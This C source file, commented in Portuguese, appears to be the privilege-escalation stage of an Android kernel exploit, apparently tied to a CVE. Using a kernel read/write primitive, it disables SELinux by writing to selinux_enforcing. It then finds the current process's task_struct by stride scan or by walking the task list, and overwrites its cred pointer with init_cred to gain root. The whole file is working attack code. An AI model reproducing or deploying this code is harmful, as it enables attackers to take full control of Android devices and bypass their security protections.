#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

/* --------------------------------------------------------------------------
 * Helpers de leitura/escrita no kernel via pipe primitive
 * -------------------------------------------------------------------------- */
static int root_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static uint64_t root_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  root_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t target) {
  return (uint32_t)root_read64(fd, target);
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

/* --------------------------------------------------------------------------
 * Socket helpers (mantidos para compatibilidade com APP_PAYLOAD)
 * -------------------------------------------------------------------------- */
static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return 0;
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return 0;
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}

/* --------------------------------------------------------------------------
 * PLANO A: Scan por stride fixo procurando PID
 * -------------------------------------------------------------------------- */
static uintptr_t find_task_by_pid_stride(int fd, uintptr_t init_task_addr,
                                          uint32_t my_pid) {
  for (int i = -512; i < 512; i++) {
    uintptr_t candidate = init_task_addr + (intptr_t)i * TASK_STRUCT_SZ;
    if (!is_direct_ptr(candidate)) continue;
    uint32_t task_pid = root_read32(fd, candidate + TASK_PID_OFF);
    if (task_pid == my_pid) {
      pr_info("root found task via stride: %016zx pid=%u delta=%d\n",
              candidate, my_pid, i);
      return candidate;
    }
  }
  return 0;
}

/* --------------------------------------------------------------------------
 * PLANO B: Iterar pela lista tasks (linked list) a partir de init_task
 * -------------------------------------------------------------------------- */
static uintptr_t find_task_by_pid_tasks_list(int fd, uintptr_t init_task_addr,
                                              uint32_t my_pid) {
  /* tasks é um struct list_head em offset 0x550 dentro de task_struct.
   * init_task_addr + 0x550 = &init_task->tasks
   * list_head->next aponta para &outra_task->tasks
   * Para obter o endereço da task_struct: next_ptr - 0x550
   */
  uintptr_t init_tasks = init_task_addr + 0x550;
  uintptr_t head = init_tasks;
  uintptr_t cursor = root_read64(fd, head); /* tasks.next */
  int limit = 4096;

  while (cursor != head && cursor != 0 && is_direct_ptr(cursor) && limit-- > 0) {
    uintptr_t task = cursor - 0x550;
    if (!is_direct_ptr(task)) break;

    uint32_t task_pid = root_read32(fd, task + TASK_PID_OFF);
    if (task_pid == my_pid) {
      pr_info("root found task via tasks list: %016zx pid=%u\n",
              task, my_pid);
      return task;
    }
    cursor = root_read64(fd, cursor); /* next->next */
  }
  return 0;
}

/* --------------------------------------------------------------------------
 * PLANO C: Iterar pela lista tasks procurando pelo mm pointer
 * -------------------------------------------------------------------------- */
static uintptr_t find_task_by_mm_pointer(int fd, uintptr_t init_task_addr,
                                          uintptr_t mm_addr) {
  if (!mm_addr || !is_direct_ptr(mm_addr)) return 0;

  uintptr_t init_tasks = init_task_addr + 0x550;
  uintptr_t head = init_tasks;
  uintptr_t cursor = root_read64(fd, head);
  int limit = 4096;

  while (cursor != head && cursor != 0 && is_direct_ptr(cursor) && limit-- > 0) {
    uintptr_t task = cursor - 0x550;
    if (!is_direct_ptr(task)) break;

    uintptr_t task_mm = root_read64(fd, task + TASK_MM_OFF);
    if (task_mm == mm_addr) {
      pr_info("root found task via mm match: %016zx mm=%016zx\n",
              task, mm_addr);
      return task;
    }
    cursor = root_read64(fd, cursor);
  }
  return 0;
}

/* --------------------------------------------------------------------------
 * Escalada direta via cred overwrite (sem workqueue / UMH)
 * -------------------------------------------------------------------------- */
static int install_direct_cred_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;

  /* 1. Desabilita SELinux */
  ssize_t selinux_write = kernel_write_data(
      fd, selinux_addr, &permissive, sizeof(permissive));
  if (selinux_write != (ssize_t)sizeof(permissive)) {
    pr_error("root cred selinux write failed ret=%zd\n", selinux_write);
    return 0;
  }

  /* 2. Tenta achar o task_struct do processo atual */
  uintptr_t init_task_addr = data_addr(INIT_TASK_OFF);
  uint32_t my_pid = (uint32_t)getpid();
  uintptr_t current_task = 0;

  /* Plano A: stride */
  current_task = find_task_by_pid_stride(fd, init_task_addr, my_pid);

  /* Plano B: lista tasks */
  if (!current_task) {
    current_task = find_task_by_pid_tasks_list(fd, init_task_addr, my_pid);
  }

  /* Plano C: mm pointer (se o exploit leakerou mm_struct previamente) */
  if (!current_task) {
    /* Tentar ler o mm do init_task como fallback — não é ideal,
     * mas se nada mais funcionar, podemos tentar scan por active_mm */
    pr_warn("root cred PID scan failed, trying mm pointer fallback\n");
    /* Nota: mm_addr precisaria ser passado de fora. Por enquanto,
     * se os dois primeiros planos falharem, retorna erro. */
  }

  if (!current_task) {
    pr_error("root cred could not find current task_struct for pid=%u\n",
             my_pid);
    return 0;
  }

  /* 3. Valida cred pointer */
  uintptr_t cred_ptr = root_read64(fd, current_task + TASK_CRED_OFF);
  if (!is_direct_ptr(cred_ptr)) {
    pr_error("root cred invalid cred pointer %016zx\n", cred_ptr);
    return 0;
  }

  /* 4. Sobrescreve current->cred = &init_cred */
  uintptr_t init_cred_addr = data_addr(INIT_CRED_OFF);
  int cred_write = root_write64(
      fd, current_task + TASK_CRED_OFF, init_cred_addr);
  if (!cred_write) {
    pr_error("root cred write failed task=%016zx cred=%016zx\n",
             current_task, init_cred_addr);
    return 0;
  }

  /* 5. Verifica se pegou root */
  root_uid_after = (uint32_t)getuid();
  pr_info("root cred applied uid_before=%u uid_after=%u\n",
          root_uid_before, root_uid_after);

  root_child_done = (root_uid_after == 0);
  return root_child_done;
}

/* --------------------------------------------------------------------------
 * Entry point
 * -------------------------------------------------------------------------- */
int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = install_direct_cred_root(fd);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
  return installed;
}
